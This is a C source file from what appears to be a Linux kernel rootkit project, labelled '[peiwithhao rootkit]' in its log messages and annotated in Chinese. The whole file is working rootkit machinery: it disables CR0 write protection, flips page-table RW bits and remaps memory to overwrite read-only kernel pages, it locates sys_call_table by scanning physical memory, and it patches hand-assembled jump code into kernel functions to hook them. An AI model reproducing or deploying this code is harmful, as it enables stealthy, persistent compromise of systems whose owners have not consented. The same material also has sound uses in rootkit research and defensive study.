#define _GNU_SOURCE
#include "helper.h"


size_t syscall_table_data[5];
size_t get_syscall_data = 0;
size_t syscall_table_addr;
struct hook_context temp_hook_ctx;


static size_t asm_read_cr0(void){
    size_t cr0;
    asm volatile(
        "movq %%cr0, %%rax;"
        "movq %%rax, %0;"
        :"=r"(cr0)
        :
        : "%rax"
    );
    return cr0;
}

static void asm_write_cr0(size_t cr0){
    asm volatile(
        "movq %0, %%rax;"
        "movq %%rax, %%cr0;"
        :
        : "r"(cr0)
        : "%rax"
    );
}

static void asm_disable_wp(void){
    size_t cr0;
    cr0 = asm_read_cr0();
    /* 如果设置了wp,则禁止 */
    if((cr0 >> 16) & 1){
        cr0 &= (~(1 << 16));
        asm_write_cr0(cr0);
    }
}


static void asm_enable_wp(void){
    size_t cr0;
    cr0 = asm_read_cr0();

    if(!((cr0 >> 16) & 1)){
        cr0 |= (1 << 16);
        asm_write_cr0(cr0);
    }
}

/* 修改cr0来写入只读页面 */
void arbitrary_cr0_write(void *dst, void *src, size_t count){
    size_t orig_cr0;
    orig_cr0 = asm_read_cr0();
    asm_disable_wp();
    memcpy(dst, src, count);
    /* 如果以前设置了WP, 将其开启 */
    if(orig_cr0 >> 16 & 1) asm_enable_wp();
}

size_t arbitrary_pte_write(void *dst, void *src, size_t size){
    pte_t * pte;
    pte_t orig_pte;
    unsigned int level;
    pte = lookup_address((unsigned long)dst, &level);
    if(IS_ERR(pte)){
        printk(KERN_INFO "[peiwithhao rootkit] get pte failed...");
        return PTR_ERR(pte);
    }
    /* 保存以前的pte */
    orig_pte.pte = pte->pte;
    /* 将rw位置为1 */
    pte->pte |= _PAGE_RW;
    printk(KERN_INFO "[peiwithhao rootkit] changed pte %lx, ", pte->pte);
    memcpy(dst, src, size);
    /* 恢复原来的pte */
    pte->pte = orig_pte.pte;
    return 0;
}



/* 使用重映射来修改只读页面 */
int arbitrary_remap_write(void *dst, void *src, size_t size){
    size_t phys_addr, phys_offset;
    size_t phys_ioremap_addr;
    /* 获取虚拟地址所在物理页帧的首地址 */
    phys_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;
    /* 获取页内地址的偏移 */
    phys_offset = (size_t )dst & 0xfff;
    /* 重新映射该物理地址到另一个虚拟地址 */
    phys_ioremap_addr = (size_t)ioremap(phys_addr, PAGE_SIZE);
    /* 拷贝内容到该虚拟地址,从而间接拷贝到只读物理地址 */
    memcpy((size_t *)(phys_ioremap_addr + phys_offset), src, size);
    /* 最后调用该函数来解除映射 */
    iounmap((size_t *)phys_ioremap_addr);
    return 0;
}


void sys_call_table_finder(void){
    /* 遍历内核,这里存放特征 */
    /* page_offset_base存放的是physmap的首虚拟地址,从这里开始就可以遍历所有的内核 */
    size_t *phys_mem = (size_t *)page_offset_base;

    char *argv[] = {
        "/sys_table_finder",
        NULL,
    };
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL,
    };
    if(get_syscall_data){
    //    printk(KERN_INFO "[peiwithhao rootkit] already have the sys_call_table at 0x%lx", syscall_table_addr);
        return;
    }

    /* 调用用户态程序 */
    /* UMH_WAIT_PROC这个标识符表示要等用户程序执行完毕 */
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    // if(!get_syscall_data){
    //     panic("failed to get the sycall data from userspace!");
    // }
    for(size_t i = 0;; i++){
        if(phys_mem[i+0] == syscall_table_data[0]
        && phys_mem[i+1] == syscall_table_data[1]
        && phys_mem[i+2] == syscall_table_data[2]
        && phys_mem[i+3] == syscall_table_data[3]
        ){
            syscall_table_addr = (size_t)&(phys_mem[i]);
            printk(KERN_INFO "[peiwithhao rootkit] sys_call_table founded at %lx", syscall_table_addr);
            break;
        }
    }
    get_syscall_data = 1;
}

 size_t do_hook(struct hook_context *hook_ctx){
     asm volatile(
         "movq %%rax, %0;"
         "movq %%rbx, %1;"
         "movq %%rcx, %2;"
         "movq %%rdx, %3;"
         "movq %%rsi, %4;"
         "movq %%r15, %5;"
         "movq %%rbp, %6;"
         "movq %%r8, %7;"
         "movq %%r9, %8;"
         "movq %%r10, %9;"
         "movq %%r11, %10;"
         "movq %%r12, %11;"
         "movq %%r13, %12;"
         "movq %%r14, %13;"
         "movq %%r15, %14;"

         : "=m"(hook_ctx->regs.ax),  "=m"(hook_ctx->regs.bx), 
           "=m"(hook_ctx->regs.cx),  "=m"(hook_ctx->regs.dx), 
           "=m"(hook_ctx->regs.si),  "=m"(hook_ctx->regs.di), 
           "=m"(hook_ctx->regs.bp),  "=m"(hook_ctx->regs.r8), 
           "=m"(hook_ctx->regs.r9),  "=m"(hook_ctx->regs.r10),
           "=m"(hook_ctx->regs.r11), "=m"(hook_ctx->regs.r12),
           "=m"(hook_ctx->regs.r13), "=m"(hook_ctx->regs.r14),
           "=m"(hook_ctx->regs.r15)
         :
         : );
     if(hook_ctx->hook_before){
         hook_ctx->hook_before(&(hook_ctx->regs));
     }
     
     arbitrary_remap_write((void *)hook_ctx->orig_func, hook_ctx->orig_code, hook_ctx->shellcode_nr);
     
     asm volatile(
         "movq %1, %%rax;"
         "movq %2, %%rbx;"
         "movq %3, %%rcx;"
         "movq %4, %%rdx;"
         "movq %5, %%rsi;"
         "movq %6, %%rdi;"
         "movq %7, %%rbp;"
         "movq %8, %%r8;"
         "movq %9, %%r9;"
         "movq %10, %%r10;"
         "movq %11, %%r11;"
         "movq %12, %%r12;"
         "movq %13, %%r13;"
         "movq %14, %%r14;"
         "movq %15, %%r15;"
         "call *%16;"
         "movq %%rax, %0"
         : "=m"(hook_ctx->ret)
         : "m"(hook_ctx->regs.ax),  "m"(hook_ctx->regs.bx), 
           "m"(hook_ctx->regs.cx),  "m"(hook_ctx->regs.dx), 
           "m"(hook_ctx->regs.si),  "m"(hook_ctx->regs.di), 
           "m"(hook_ctx->regs.bp),  "m"(hook_ctx->regs.r8), 
           "m"(hook_ctx->regs.r9),  "m"(hook_ctx->regs.r10),
           "m"(hook_ctx->regs.r11), "m"(hook_ctx->regs.r12),
           "m"(hook_ctx->regs.r13), "m"(hook_ctx->regs.r14),
           "m"(hook_ctx->regs.r15), "m"(hook_ctx->orig_func)
         : 
     );
     if(hook_ctx->hook_after){
         hook_ctx->hook_after(&(hook_ctx->regs));
     }
     
     arbitrary_remap_write((void *)hook_ctx->orig_func, hook_ctx->hook_code, hook_ctx->shellcode_nr);
     return hook_ctx->ret;
 }




/* 向函数添加hook */
ssize_t hookpoint_add(struct hook_context *hook_ctx, size_t orig_func, size_t hook_before, size_t hook_after){
    size_t shellcode_nr;
    size_t index;
    size_t hook_ctl;
    size_t hook_ctx_ptr;
    /* 保存hook函数 */
    hook_ctx->hook_before = (void (*)(struct pt_regs *))hook_before;
    hook_ctx->hook_after = (void (*)(struct pt_regs *))hook_after;
    hook_ctx->orig_func = (void (*)(size_t, size_t, size_t, size_t, size_t, size_t))orig_func;

    hook_ctl = (size_t)do_hook;
    hook_ctx_ptr = (size_t)hook_ctx;

    // mov r15 rdi
    shellcode_nr = sizeof(u8) + sizeof(u8) + sizeof(u8);
    // mov rdi, hook_ctx
    shellcode_nr += sizeof(u8) + sizeof(u8) + sizeof(size_t);
    // jmp [rip + ]
    shellcode_nr += sizeof(u8) + sizeof(size_t);

    /* 保存指令 */
    memcpy((size_t *)(hook_ctx->orig_code), (size_t *)orig_func, shellcode_nr);

    
    index = 0;

    hook_ctl = hook_ctl  - orig_func - shellcode_nr + 4;
    /* mov r15, rdi */
    ((char *)(hook_ctx->hook_code))[index++] = 0x49;
    ((char *)(hook_ctx->hook_code))[index++] = 0x89;
    ((char *)(hook_ctx->hook_code))[index++] = 0xff;
    // /* mov rdi, hook_ctx */
    ((char *)(hook_ctx->hook_code))[index++] = 0x48;
    ((char *)(hook_ctx->hook_code))[index++] = 0xBF;
    for(int i = 0; i < sizeof(size_t) ; i++){
        ((char *)hook_ctx->hook_code)[index++] = ((char *)&hook_ctx_ptr)[i];

    }
    /* jmp [rip + ] */
    //shell_code[index++] = 0xE9;
    ((char *)hook_ctx->hook_code)[index++] = 0xE9;
    for(int i = 0; i < sizeof(size_t) ; i++){
        ((char *)hook_ctx->hook_code)[index++] = ((char *)&hook_ctl)[i];
    }
    /* 保存shellcode */
    hook_ctx->shellcode_nr = shellcode_nr;

    arbitrary_remap_write((void *)orig_func, hook_ctx->hook_code, shellcode_nr);

    return 0;
}


ssize_t hookpoint_del(struct hook_context *hook_ctx){
    arbitrary_remap_write((void *)hook_ctx->orig_func, hook_ctx->orig_code, hook_ctx->shellcode_nr);
    return 0;
}
